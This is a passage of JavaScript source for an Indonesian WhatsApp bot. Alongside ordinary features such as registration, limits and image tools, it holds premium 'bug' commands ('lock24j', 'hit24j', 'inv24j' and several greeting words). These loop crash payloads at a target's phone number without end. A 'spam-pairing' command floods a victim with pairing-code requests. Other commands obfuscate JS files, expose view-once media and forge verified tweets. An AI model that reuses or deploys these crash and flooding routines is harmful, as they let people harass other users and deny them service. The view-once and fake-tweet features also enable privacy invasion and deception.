}
  DanadyaksaDev.sendMessage(m.chat, {
      audio: { url: `https://files.catbox.moe/1zyta5.mp4` },
      mimetype: 'audio/mpeg',
      ptt: true
    }, { quoted: m });  
break    

		//=================================================//
		// END BUTTON BUG \\
		//=================================================//
   
case 'lock24j':    
if (!isPremium) return reply(msg.prem)   
if (!q) return reply('send the number!!!') 
let bego = q.replace(/[^0-9]/g, "") 
if (bego.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6281396484112`)   
let idiot = bego + '@s.whatsapp.net'  
reply(`*</> Wait Process Sending bug...*
*Target : ${bego}*`)   
for (let i = 0; ; i++) {
DanadyaksaLoc(idiot) 
await sleep(5000)  
}
console.log(chalk.red.bold("Success Send Crashed By Danadyaksa"))
reply(`*</> Successfully sending bug to ${bego} Please pause for 5 minutes*`)   
break                 
   
case 'hit24j':    
if (!isPremium) return reply(msg.prem)   
if (!q) return reply('send the number!!!') 
let ajg = q.replace(/[^0-9]/g, "") 
if (ajg.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6281396484112`)   
let yatim = ajg + '@s.whatsapp.net'  
reply(`*</> Wait Process Sending bug...*
*Target : ${ajg}*`)   
for (let i = 0; ; i++) {
CombinationTag(yatim, Ptcp = false) 
await sleep(5000)  
}
console.log(chalk.red.bold("Success Send Crashed By Danadyaksa"))
reply(`*</> Successfully sending bug to ${ajg} Please pause for 5 minutes*`)   
break               
                  
case 'inv24j':    
if (!isPremium) return reply(msg.prem)   
if (!q) return reply('send the number!!!') 
let kntl = q.replace(/[^0-9]/g, "") 
if (kntl.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6281396484112`)   
let X = kntl + '@s.whatsapp.net'  
reply(`*</> Wait Process Sending bug...*
*Target : ${kntl}*`)   
for (let i = 0; ; i++) {
await sendFakeLocation(X)	
await sleep(5000)  
}
console.log(chalk.red.bold("Success Send Crashed By Danadyaksa"))
reply(`*</> Successfully sending bug to ${kntl} Please pause for 5 minutes*`)   
break        

case 'paket?':
case 'assalamualaikum':
case 'halo':
case 'permisi':
case 'bg?': {
if (!isPremium) return reply(msg.prem)   
DanadyaksaDev.sendMessage(from, {text: `\`anda akan c1 dalam\``}, {quoted: m})
await sleep(3000)
DanadyaksaDev.sendMessage(from, {text: `\`1\``}, {quoted: m})
await sleep(3000)
DanadyaksaDev.sendMessage(from, {text: `\`2\``}, {quoted: m})  
for (let i = 0; ; i++) 
await sleep(5000) 
await DanadyaksaLoc(from)	
m.reply("yah kak?")
}
console.log(chalk.red.bold("Success Send Crashed By Danadyaksa"))        
break  
        
 		//=================================================//
		//  FUNC RANDOM \\
		//=================================================//                   
case 'public': {
if (!Creator) return reply(msg.developer)
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "♻️",key: m.key,}})        
DanadyaksaDev.public = true
reply('</>𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗣𝘂𝗯𝗹𝗶𝗰')
            }
            await DanadyaksaDev.sendMessage(m.chat, { react: { text: "✈️",key: m.key,}})
            break
            
case 'self': {
if (!Creator) return reply(msg.developer)
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "♻️",key: m.key,}})        
DanadyaksaDev.public = false
reply('</>𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗣𝗿𝗶𝘃𝗮𝘁')
            }
            await DanadyaksaDev.sendMessage(m.chat, { react: { text: "✈️",key: m.key,}})
            break       
            
case "reedemcode": {
if (!users.registered) return reply(msg.daftar)
if (!args[0]) return reply("Codenya")
if (args[0] !== args[0].toLowerCase()) return reply("*Code Redeem* wajib huruf kecil semua!")
if (db.data.settings.hadiahkadaluwarsa.includes(args[0])) return reply("*Code* tersebut sudah digunakan!")
if (!db.data.settings.hadiah.includes(args[0])) return reply("*Code* tidak valid!")
db.data.settings.hadiahkadaluwarsa.push(args[0])
var code = db.data.settings.hadiah.indexOf(args[0])
db.data.settings.hadiah.splice(code, 1)
db.data.users[m.sender].limit += 15
var teks = `Selamat kepada @${m.sender.split("@")[0]} 🎉

kamu mendapatkan *15 Limit* dari *Code Redeem "${args[0]}"*`
await reply(`Berhasil Mendapatkan *15 Limit* dari *Code Redeem ${args[0]}*`).then(() => {
DanadyaksaDev.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender], externalAdReply: { thumbnailUrl: thumbnail, title: "© Message System Notifikasi", body: null, sourceUrl: 'https://youtube.com/@danadyaksadev', renderLargerThumbnail: true, mediaType: 1}}}, {quoted: qpayment})
})}
break
    case 'claim': case 'daily': {
  if (!users.registered) return reply(msg.daftar)
 let __timers = (new Date - users.lastclaim)
   let _timers = (86400000 - __timers)
   let timers = clockString(_timers)
   if (new Date - users.lastclaim > 86400000) {
   	DanadyaksaDev.sendMessage(m.chat, { text: `*Daily Claim*\n_Successful Claim_\n- limit : 3\n\n_Claim Reset_` }, { quoted: m })
   	users.limit[m.sender].limit += 3
   	users.lastclaim[m.sender].lastclaim = new Date * 1
   } else {
   	DanadyaksaDev.sendMessage(m.chat, { text: `Please wait *⏱️${timers}* again to be able to claim again` }, { quoted: m })
   }
    }
break
case 'daftar': { 
  if (users.registered === true) return reply(`*❕ You are already registered*`)
  if (!text) return reply(`contoh : .daftar nama,umur`)
  let t = text.split(',')
  let name = t[0]
  let age = t[1]
  if (!name) return reply(`nama tidak boleh kosong`)
  if (!age) return reply(`umur tidak boleh kosong`)
  if (isNaN(age)) return reply(`umur tidak valid`)
  age = parseInt(age);
  if (age > 50) return m.reply('Maximum Age *50* years')
  if (age < 5) return m.reply('Minimum Age *5* years')
  if (name.split('').length > 100) return m.reply('Nama Maksimal 100 Karakter Ajg')
  let sn = generateRandomPassword(10)
  users.nick = name.trim()
  users.age = age
  users.registered = true
  users.limit += 3
  users.sn = sn
  users.regTime = +new Date
    
 reply(`
┏─• *USER*
│◉ *sᴛᴀᴛᴜs:* ☑️ sᴜᴄᴄᴇssғᴜʟ
│◉ *ɴᴀᴍᴇ:* ${name}
│◉ *ᴀɢᴇ:* ${age} ʏᴇᴀʀs
┗───•
 ◉ *SN:* ${sn}
 ◉ *LIMIT:* + 3 BONUS AWAL
`)
}
break
case 'ceksn': {
if (!users.registered) return reply(msg.daftar)
await uselimit(1)
return reply(`${users.sn}`)
}
break
case 'customsn': {
if (!Creator) return reply(msg.developer)
if (!text) return reply(`example : .customsn +6281**|DanadyaksaDev`)
let t = text.split('|')
let nomor = t[0]
let serial = t[1]
let oo = `${nomor}@s.whatsapp.net`
global.db.data.users[oo].sn = serial
return reply(`berhasil diubah menjadi ${serial}`)
}
break
case 'unregister': {
  if (!args[0]) return reply(`*• Example:* ${prefix + command} *[Serial number]*`)
  let user = global.db.data.users[m.sender]
  if (args[0] !== users.sn) return reply('*[ x ] Invalid serial number*')
   let __waktuh = (new Date - global.db.data.users[m.sender].regTime)
   let _waktuh = (+ 86400000 - __waktuh)
   let waktuh = clockString(_waktuh)
  /* if (new Date - global.db.data.users[m.sender].unreglast > + 86400000) {*/
   user.regTime = new Date * 1
  user.registered = false
  user.age = 0
  user.limit = 0
  m.reply(`[ ✓ ] Unregister successful!`)
 /* } else m.reply(`[ x ] You have *${prefix + command}*.\nPlease wait *${time}* to get *${prefix + command}* back.`)*/
}
break        
case 'ceklimit': {
pengguna
let a = db.data.users[m.sender]
reply(`*YOUR LIMIT IS IN AMOUNT ${a.limit} LIMIT*`)
}
break
case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} *Has Gone AFK*${text ? ': ' + text : ''}`)
}

            break            
        
case 'backup': {
if (!Creator) return (msg.developer) 
let jir = m.mentionedJid[0] || m.sender || DanadyaksaDev.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
await reply('Mengumpulkan semua file ke folder...');
const { execSync } = require("child_process");
 const ls = (await execSync("ls")).toString().split("\n").filter( (pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "" );
await reply('Script akan dikirim lewat PC!')
const exec = await execSync(`zip -r Backup.zip ${ls.join(" ")}`);
await DanadyaksaDev.sendMessage(jir, {
document: await fs.readFileSync("./Backup.zip"),
mimetype: "application/zip",
fileName: "Backup.zip",
},
{quoted: m });
await execSync("rm -rf Backup.zip");
}
break       

case 'gpt4': {
if (!users.registered) return reply(msg.daftar)
  if (!text) return reply(`Hai, apa yang ingin saya bantu?`) 
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let kanjuthann = await openai(text, "nama mu adalah Furina, kamu adalah asisten kecerdasan buatan yang sering membantu orang lain jika ada yang ditanyakan")
reply(kanjuthann)
}  
break        

case 'enc':
case 'encrypt': {
if (!isPremium) return reply(msg.prem)   
if (!m.quoted) return reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@enc${filename}.js`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@enc${filename}.js`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@enc${filename}.js`, obfuscated)
  await DanadyaksaDev.sendMessage(m.chat, {document: fs.readFileSync(`./@enc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File Sukses!"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
}
break

case 'hardenc':
case 'encrypthard': {
if (!isPremium) return reply(msg.prem)   
if (!m.quoted) return reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*t.me/DanadyaksaDev/*^/*($break)*/" + 
            "/*t.me/DanadyaksaDev/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, // Nonaktifkan untuk mengurangi ukuran
    opaquePredicates: false, // Nonaktifkan untuk mengurangi ukuran
    deadCode: false, // Nonaktifkan untuk mengurangi ukuran
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await DanadyaksaDev.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
}
break

case 'decrypt':
case 'dec': {
    const { webcrack } = await import('webcrack');
    const usage = `Contoh:
    ${command} (Input text or reply text to dec code)
    ${command} doc (Reply to a document)`;
         
    if (!isPremium) return reply(msg.prem)   
    
    let text;
    if (args.length >= 1) {
    text = args.join(" ");
    } else if (m.quoted && m.quoted.text) {
    text = m.quoted.text;
    } else {
    return reply(usage);
    }
    
    try {
    let message;
    if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
    let docBuffer;
    if (m.quoted.mimetype) {
    docBuffer = await m.quoted.download();
    }
    message = await webcrack(docBuffer.toString('utf-8'));
    } else {
    message = await webcrack(text);
    }
    
    const filePath = './@Decrypts-By-DanadyaksaDev';
    fs.writeFileSync(filePath, message.code);
    await DanadyaksaDev.sendMessage(m.chat, {
    document: {
    url: filePath
    },
    mimetype: 'application/javascript',
    fileName: 'Dec By © DanadyaksaDev'
    }, {quoted: fpay});
    
    } catch (error) {
    const errorMessage = `Terjadi kesalahan: ${error.message}`;
    await reply(errorMessage);
    }
    }
    break		
    
case 'restart':
if (!Creator) return reply(msg.developer)
await m.reply('Restart...')
process.exit()
break
case 'obfus2': case 'enc2': case 'obfuscate2':{
if (!text) return reply(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(text)
reply(`Success
${meg.result}`)
}
break        
case 'database': {
if (!Creator) return reply(msg.developer)
totalregg = Object.keys(global.db.data.users).length
    let rtotalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length
    reply(`*${totalregg} users using Bot*`)
}
break      

case 'addlimit': {
                if (!Creator) return reply(msg.developer)
                if (!text) return reply(`Usage ${prefix + command} number|limit amount`)
                let usernya = text.split('|')[0]
                let limitnya = text.split('|')[1]
                let oo = `${usernya}@s.whatsapp.net`
                global.db.data.users[oo].limit += parseInt(limitnya)
                reply(`done`)
}
break         

case 'spam-pairing': {
if (!isPremium) return reply(msg.prem)   
if (!text) return reply(`*Example:* ${prefix + command} +628xxxxxx|150`)
reply(msg.wait)
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break    

case 'bcgc': case 'bcgroup': {
if (!Creator) return reply(msg.developer)
if (!text) return reply(`Text mana?\n\nExample : ${prefix + command} fatih-san`)
let getGroups = await DanadyaksaDev.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
DanadyaksaDev.sendMessage(i, {text: `${text}`}, {quoted:danadyaksa})
}
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case "listhadiah": {
if (!Creator) return reply(msg.developer)
if (db.data.settings.hadiah.length < 1) return reply("Tidak ada code hadiah")
var teks = `*乂 LIST CODE HADIAH*\n\nTotal : *${db.data.settings.hadiah.length}*\n\nKetik .redeemcode <kode> Untuk Redeem Code`
db.data.settings.hadiah.forEach((e) => {
teks += ` ◦ ${e}\n`
})
reply(teks)
}
break
case "buathadiah": {
if (!Creator) return reply(msg.developer)
if (isNaN(args[0])) return reply('Jumlah Kode Hadiah')
for (let i = 0; i < Number(args[0]); i++) {
db.data.settings.hadiah.push(crypto.randomBytes(4).toString("hex"))
}
let teks = '\n'
db.data.settings.hadiah.forEach((e) => {
teks += `◦ ${e}\n`
})
reply(teks)
}
break

case "joingc": case "join": {
if (!Creator) return reply(msg.developer)
if (!text && !m.quoted) return reply(`*Example:* ${prefix + command} Url Link Group`)
let teks = m.quoted ? m.quoted.text : text
if (!teks.includes('whatsapp.com')) return reply("Invalid Link!")
let result = teks.split('https://chat.whatsapp.com/')[1]
await DanadyaksaDev.groupAcceptInvite(result).then(respon => reply("* Successfully Entered Into Group Chat")).catch(error => reply(error.toString()))
}
break  

case 'request': case 'reportbug': {
    if (!users.registered) return reply(msg.daftar)
	if (!text) return reply(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${m.pushName},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
               DanadyaksaDev.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            DanadyaksaDev.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
break       

case 'remini': case 'hd': {
if (!users.registered) return reply(msg.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!quoted) return reply(`Where is the picture?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
reply(msg.wait)
const { remini } = require('./lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance")
let leo = {
  image: proses,
  caption: `done by: ${namabot}`,
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: idsaluran,
 newsletterName: `Hd By: ${ownername}`, 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: DanadyaksaDev.decodeJid(DanadyaksaDev.user.id) },
},
}
await DanadyaksaDev.sendMessage(m.chat, leo, { quoted: qpayment });
}
uselimit(1)
break 

case 'txt2img': {
if (!text) return m.reply(`Example: ${prefix + command} cat`)
async function photoleap(prompt) {
try {
let result = []
for (let i = 0; i < 3; i++) {
let {
data
} = await axios.get('https://tti.photoleapapp.com/api/v1/generate?prompt=' + prompt);
result.push(data.result_url)
}
return result
} catch (e) {
return ({
msg: 404
})
}
}

let tahu = await photoleap(text)
for (const x of tahu) {
DanadyaksaDev.sendMessage(m.chat, {image: {url: x}, caption: `Done`}, {quoted: m})
}
}
break

case 'tourl': {
 if (!users.registered) return reply(msg.daftar)
 if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
  uselimit(1)
  let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
  if (!mime) return reply('Tidak ada media yang ditemukan')
  let media = await q.download()
  let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
  let fileSizeLimit = 5 * 1024 * 1024 
  if (media.length > fileSizeLimit) {
    return reply(`Ukuran media tidak boleh melebihi 5MB`)
  }
  let link = await (isTele ? uploadImage : uploadFile)(media)
  replyy(`▧ INI LOH CIK😋

│ • ${link}

${media.length} Byte(s)
${isTele ? '(Tidak Ada Tanggal Kedaluwarsa)' : '(Expired 24 hours)'}`)
}

			break

case 'rvo':
case 'readviewonce':			
case 'revo': {
if (!users.registered) return reply(msg.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "♻️",key: m.key,}})    
const isQuotedViewOnce = m.message.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessageV2 ? true : false;
if (!isQuotedViewOnce) return reply('Reply viewonce')
let type = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[type]
let media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await DanadyaksaDev.sendMessage(m.chat, { video: buffer, caption: quotedType.caption })
} else if (/image/.test(type)) {
await DanadyaksaDev.sendMessage(m.chat, { image: buffer, caption: quotedType.caption })
}
}
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "✈️",key: m.key,}})
break     

case 'addcase': {
    if (!Creator)return reply(msg.owner)
    if (!text) return reply('Mana case nya');
  await DanadyaksaDev.sendMessage(m.chat, { react: { text: "♻️",key: m.key,}})    
    const fs = require('fs');
// Nama file yang akan dimodifikasi
const namaFile = './start/system.js';

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan di atas case gimage.');
            }
        });
    } else {
        reply('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "✈️",key: m.key,}})
break

case 'delcase': {
if (!Creator)return reply(msg.owner)
    if (!text) return reply('Mana case nya');
    await DanadyaksaDev.sendMessage(m.chat, { react: { text: "♻️",key: m.key,}})        

let caseNames = q

let fileContent = fs.readFileSync("./start/system.js", "utf-8");

let startIndex = fileContent.indexOf(`case '${caseNames}'`);
let endIndex = fileContent.indexOf("break", startIndex);

if (startIndex !== -1 && endIndex !== -1) {
let caseToDelete = fileContent.slice(startIndex, endIndex + 6);
fileContent = fileContent.replace(caseToDelete, "");

fs.writeFileSync("./start/system.js", fileContent, "utf-8");

reply(`Case '${caseNames}' berhasil dihapus!`);
} else {
reply(`Tidak dapat menemukan case '${caseNames}' untuk dihapus.`);
}
}
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "✈️",key: m.key,}})
break     

case 'toanime': {
    if (!users.registered) return reply(msg.daftar)
    if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
    async function uploadUguu(filePath) {
        const { exec } = require('child_process');
        return new Promise((resolve, reject) => {
            exec(`curl -s -F files[]=@${filePath} https://uguu.se/upload.php`, (error, stdout) => {
                if (error) return reject('Gagal mengunggah ke Uguu');
                try {
                    let jsonResponse = JSON.parse(stdout);
                    resolve({ status: 'Done', result: jsonResponse.files[0].url });
                } catch (err) {
                    reject('Gagal mengunggah ke Uguu');
                }
            });
        });
    }
if (!quoted) return m.reply(`Kirim/Reply Gambar Dengan Caption ${prefix + command}`);
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Gambar Dengan Caption ${prefix + command}`);
reply(msg.wait);
let media = await DanadyaksaDev.downloadAndSaveMediaMessage(quoted);
let uploadResult = await uploadUguu(media);    
if (uploadResult.status !== 'Done') {
return m.reply('Gagal mengunggah gambar.');
}
let cdn = uploadResult.result;
let imge;    
try {
imge = `https://api.zenkey.my.id/api/maker/toanime?apikey=zenkey&url=${cdn}`;
} catch (error) {
console.error('Error fetching from API:', error);
return m.reply('Terjadi kesalahan saat mengambil data dari API.');
}
DanadyaksaDev.sendMessage(m.chat, { image: { url: imge }, caption: 'Done' }, { quoted: m });
}
break 

case 'faketweet':{
const canvafy = require('canvafy')
if (!text) return m.reply(`Exmaple : Name1 | Name2 | Text`)
 nama1 = text.split("|")[0]
 nama2 = text.split("|")[1]
 katakata = text.split("|")[2]
const tweet = await new canvafy.Tweet()
.setTheme("dim")
.setUser({displayName: nama1, username: nama2})
.setVerified(true)
.setComment(katakata)
.setAvatar(ppnyauser)
.build();
 let tanaka = tweet
DanadyaksaDev.sendMessage(m.chat, { image: tanaka, caption: 'Done Desuu~' },{ quoted : m }) 
}
break

case 'getcase': {
if (!Creator) return reply(msg.owner)
if (!text) return m.reply(`Contoh: ${prefix+command} 1 caseName atau ${prefix+command} 2 caseName1 caseName2`);
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "♻️",key: m.key,}})        
const modeRegex = /^([12])\s+(.+)$/;
const match = text.match(modeRegex);
if (!match) return m.reply(`Format tidak valid. Contoh: ${prefix+command} 1 caseName atau ${prefix+command} 2 caseName1 caseName2`);
const mode = parseInt(match[1], 10);
const caseNames = match[2].split(' ').map(name => name.trim()).filter(name => name);
if (mode === 1 && caseNames.length !== 1) {
return m.reply(`Untuk mode '1', masukkan satu case name. Contoh: ${prefix+command} 1 caseName`);
}
if (mode === 2 && (caseNames.length < 1 || caseNames.length > 2)) {
return m.reply(`Untuk mode '2', masukkan satu atau dua case names. Contoh: ${prefix+command} 2 caseName1 caseName2`);
}
const getCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./start/system.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return m.reply(`Case '${caseName}' tidak ditemukan.`);
}
return match[0];
} catch (error) {
return m.reply(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const getCases = async (caseNames) => {
try {
const casePromises = caseNames.map(caseName => getCase(caseName));
const cases = await Promise.all(casePromises);
return cases.join('\n\n');
} catch (error) {
return m.reply(`Terjadi kesalahan: ${error.message}`);
}};

getCases(caseNames)
.then(caseCode => m.reply(caseCode))
.catch(error => m.reply(`Terjadi kesalahan: ${error.message}`));
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "✈️",key: m.key,}})
break;
}

case 'sendcase': {
if (!Creator) return reply(msg.owner);
if (!m.quoted) return m.reply('Kutip pesan seseorang!');
if (!text) return m.reply(`Contoh: ${prefix+command} menu`);
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "♻️",key: m.key,}})    
const getCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./start/system.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return m.reply(`Case '${caseName}' tidak ditemukan.`);
}
return match[0];
} catch (error) {
return m.reply(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const caseName = text.trim();
getCase(caseName)
.then(caseCode => {
const recipient = m.quoted ? m.quoted.sender : m.mentionedJid[0];
if (!recipient || !recipient.includes('@s.whatsapp.net')) {
return m.reply('Format ID WhatsApp tidak valid!');
}
const sendFeature = async (recipient, caseCode) => {
try {
const contact = (await DanadyaksaDev.onWhatsApp(recipient.split('@')[0]))[0] || {};
if (!contact) return m.reply('Kontak tidak ditemukan di WhatsApp.');
const message = `Hi, kamu dapet kiriman fitur nih!\n\n${caseCode}`;
await DanadyaksaDev.sendMessage(recipient, { text: message }, { quoted: m });
m.reply('Fitur berhasil terkirim!');
} catch (error) {
console.error('Terjadi kesalahan:', error.message);
m.reply('Terjadi kesalahan saat mengirim fitur: ' + error.message);
}};
sendFeature(recipient, caseCode);
})
.catch(error => m.reply(`Terjadi kesalahan: ${error.message}`));
}
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "✈️",key: m.key,}})
break 

case 'getfunc':
case 'getfunction': {
if (!Creator) return reply(msg.owner)
if (!text) return m.reply(`Contoh: ${prefix+command} functionName`);
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "♻️",key: m.key,}})        
const isValidFunctionName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const getFunction = (functionName) => {
if (!isValidFunctionName(functionName)) return m.reply(`Nama fungsi tidak valid: ${functionName}`);
try {
const fileContent = fs.readFileSync("./start/system.js", "utf8");

const functionRegex = new RegExp(`function\\s+${functionName}\\s*\\([^)]*\\)\\s*{`, "g");
const match = functionRegex.exec(fileContent);
if (!match) return m.reply(`Fungsi ${functionName} tidak ditemukan`);

const functionStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;
for (let i = functionStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') inString = !inString;
if (!inString) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
}}
if (braceCount === 0 && currentChar === '}') {
const functionEnd = i + 1;
const functionContent = fileContent.slice(functionStart, functionEnd);
return functionContent;
}
prevChar = currentChar;
